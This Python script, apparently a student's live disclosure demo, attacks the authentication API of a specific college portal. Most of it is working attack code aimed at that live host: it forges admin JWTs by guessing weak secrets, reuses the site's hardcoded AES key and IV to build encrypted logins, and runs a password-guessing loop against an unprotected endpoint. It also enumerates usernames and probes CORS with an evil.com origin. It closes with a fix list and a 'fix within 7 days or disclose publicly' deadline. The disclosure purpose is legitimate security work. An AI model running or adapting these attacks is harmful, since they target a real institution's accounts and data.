#!/usr/bin/env python3
"""
GHRIETN Security Demo — Live Walkthrough
Run this during the presentation to IT team.

Usage: python3 demo.py
"""

import time
import json
import base64
import hmac
import hashlib
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# ─── Config ────────────────────────────────────────────────────────────────
BASE_URL = "https://ghrietn.cybervidya.net"
JWT_SECRET = "secret"
CIPHER_KEY = "NPdLWA5w7yFQhPeUuKmO/A=="
CIPHER_IV = "bV5V6nK4phvQG9ZhkAjugQ=="

# ─── Helpers ───────────────────────────────────────────────────────────────
def banner(text):
    print(f"\n{'='*60}")
    print(f"  {text}")
    print(f"{'='*60}")

def step(num, text):
    print(f"\n  [{num}] {text}")
    time.sleep(1)

def result(text):
    print(f"  ✅ {text}")
    time.sleep(0.5)

def fail(text):
    print(f"  ❌ {text}")
    time.sleep(0.5)

def wait():
    time.sleep(2)

# ─── Demo ──────────────────────────────────────────────────────────────────
def demo_1_jwt_forgery():
    banner("DEMO 1: JWT Token Forgery")
    
    step(1, "The portal uses JWT tokens for authentication")
    step(2, "JWT tokens are signed with a secret key")
    step(3, "Let's check what the secret is...")
    
    # Try common secrets
    secrets_to_try = ["secret", "password", "changeme", "123456"]
    
    for secret in secrets_to_try:
        # Forge a token
        header = base64.urlsafe_b64encode(json.dumps({"alg":"HS256","typ":"JWT"}, separators=(',',':')).encode()).rstrip(b'=').decode()
        payload = base64.urlsafe_b64encode(json.dumps({"sub":"demo","role":"ADMIN","exp":1999999999}, separators=(',',':')).encode()).rstrip(b'=').decode()
        unsigned = f"{header}.{payload}"
        sig = hmac.new(secret.encode(), unsigned.encode(), hashlib.sha256).digest()
        sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
        token = f"{unsigned}.{sig_b64}"
        
        # Test it
        resp = requests.get(f"{BASE_URL}/api/auth/user-details",
            headers={"Authorization": f"Bearer {token}"}, timeout=10)
        
        if resp.status_code == 500:
            result(f"Secret '{secret}' WORKS! Server accepted the token")
            print(f"\n  Token: {token[:60]}...")
            break
        else:
            fail(f"Secret '{secret}' didn't work")
    
    step(4, "The server accepted our forged token")
    step(5, "This means anyone can create admin tokens")
    step(6, "No special tools needed — just Python")

def demo_2_encryption_bypass():
    banner("DEMO 2: Encryption Bypass")
    
    step(1, "The portal 'encrypts' passwords before login")
    step(2, "The encryption keys are in the JavaScript bundle")
    
    # Open browser would go here in real demo
    print(f"\n  Browser: Open {BASE_URL}")
    print(f"  Press F12 → Sources → Search → type 'cipherkey'")
    wait()
    
    step(3, "Found the keys:")
    print(f"     cipherkey: {CIPHER_KEY}")
    print(f"     cipheriv:  {CIPHER_IV}")
    
    step(4, "Let's encrypt a password using these keys")
    
    key_bytes = base64.b64decode(CIPHER_KEY)
    iv_bytes = base64.b64decode(CIPHER_IV)
    
    cipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)
    encrypted = base64.b64encode(cipher.encrypt(pad(b"test123", AES.block_size))).decode()
    
    print(f"     Password: test123")
    print(f"     Encrypted: {encrypted}")
    
    step(5, "Send encrypted password to the server")
    
    resp = requests.post(f"{BASE_URL}/api/auth/encrypt/login",
        json={
            "userName": encrypted,
            "password": encrypted,
            "device": "WEB",
            "version": None,
            "reCaptchaToken": "test"
        }, timeout=10)
    
    data = resp.json()
    reason = data.get("error", {}).get("reason", "")
    
    if "captcha" in reason.lower():
        result("Server accepted the encrypted password!")
        print(f"  (Only rejected because of fake captcha)")
    else:
        result(f"Server response: {reason}")
    
    step(6, "The encryption provided zero security")

def demo_3_brute_force():
    banner("DEMO 3: Unprotected Login (Brute Force)")
    
    step(1, "There's a SECOND login endpoint")
    step(2, "This one accepts raw passwords — no encryption")
    step(3, "Let's try it...")
    
    # Try a few passwords
    passwords = ["admin", "password", "123456", "superadmin"]
    
    for pwd in passwords:
        resp = requests.post(f"{BASE_URL}/api/auth/login",
            json={"userName": "demo", "password": pwd, "device": "WEB", "version": None},
            timeout=10)
        
        data = resp.json()
        reason = data.get("error", {}).get("reason", "unknown")
        
        print(f"  Trying '{pwd}'... → {reason}")
        time.sleep(0.3)
    
    step(4, "Notice: no rate limiting, no captcha, no lockout")
    step(5, "An attacker can try thousands of passwords")
    step(6, "This is a direct brute-force vector")

def demo_4_account_enumeration():
    banner("DEMO 4: Account Enumeration")
    
    step(1, "The login tells us if an account exists")
    
    # Try existing vs non-existing
    accounts = ["superadmin", "admin", "nonexistent123"]
    
    for user in accounts:
        resp = requests.post(f"{BASE_URL}/api/auth/login",
            json={"userName": user, "password": "wrong", "device": "WEB", "version": None},
            timeout=10)
        
        reason = resp.json().get("error", {}).get("reason", "unknown")
        
        if "blocked" in reason.lower():
            result(f"'{user}' → EXISTS (account is locked)")
        elif "invalid" in reason.lower():
            fail(f"'{user}' → does NOT exist")
        else:
            print(f"  '{user}' → {reason}")
    
    step(2, "We now know 'superadmin' is a real account")
    step(3, "Attacker can target only valid usernames")

def demo_5_cors():
    banner("DEMO 5: CORS Misconfiguration")
    
    step(1, "CORS should only allow our domain")
    step(2, "Let's test with a different origin...")
    
    resp = requests.options(f"{BASE_URL}/api/auth/encrypt/login",
        headers={
            "Origin": "https://evil.com",
            "Access-Control-Request-Method": "POST"
        }, timeout=10)
    
    acao = resp.headers.get("Access-Control-Allow-Origin", "not set")
    
    if acao == "*":
        result("Server allows ANY origin!")
        print(f"  Access-Control-Allow-Origin: {acao}")
    else:
        fail(f"Server returned: {acao}")
    
    step(3, "Any website can make requests to the auth API")
    step(4, "Combined with the encryption bypass: full credential theft")

def demo_summary():
    banner("SUMMARY")
    
    findings = [
        ("JWT secret is 'secret'", "CRITICAL", "Forge any user token"),
        ("Hardcoded encryption keys", "CRITICAL", "Bypass password encryption"),
        ("Unprotected login endpoint", "HIGH", "Direct brute-force"),
        ("Account enumeration", "MEDIUM", "Target valid accounts"),
        ("CORS wildcard", "HIGH", "Cross-origin attacks"),
    ]
    
    print(f"\n  {'Finding':<35} {'Severity':<12} {'Impact'}")
    print(f"  {'-'*70}")
    
    for finding, severity, impact in findings:
        print(f"  {finding:<35} {severity:<12} {impact}")
    
    print(f"\n  What needs to be fixed:")
    print(f"  1. Change JWT secret to random 256-bit value")
    print(f"  2. Add rate limiting on login endpoints")
    print(f"  3. Remove the unprotected login endpoint")
    print(f"  4. Fix CORS to only allow official domain")
    print(f"  5. Remove client-side encryption")
    
    print(f"\n  Timeline: Fix within 7 days or disclose publicly")

# ─── Main ──────────────────────────────────────────────────────────────────
def main():
    print("""
╔══════════════════════════════════════════════════════════════╗
║          GHRIETN Student Portal — Security Demo              ║
║          Researcher: Siddhant (ETC Student)                  ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    print("  Press Enter to start each demo...")
    input()
    
    demo_1_jwt_forgery()
    input("\n  Press Enter for next demo...")
    
    demo_2_encryption_bypass()
    input("\n  Press Enter for next demo...")
    
    demo_3_brute_force()
    input("\n  Press Enter for next demo...")
    
    demo_4_account_enumeration()
    input("\n  Press Enter for next demo...")
    
    demo_5_cors()
    input("\n  Press Enter for summary...")
    
    demo_summary()
    
    print(f"\n  Demo complete. Report: https://github.com/25sidhx/ghrietn-security-audit\n")

if __name__ == "__main__":
    main()
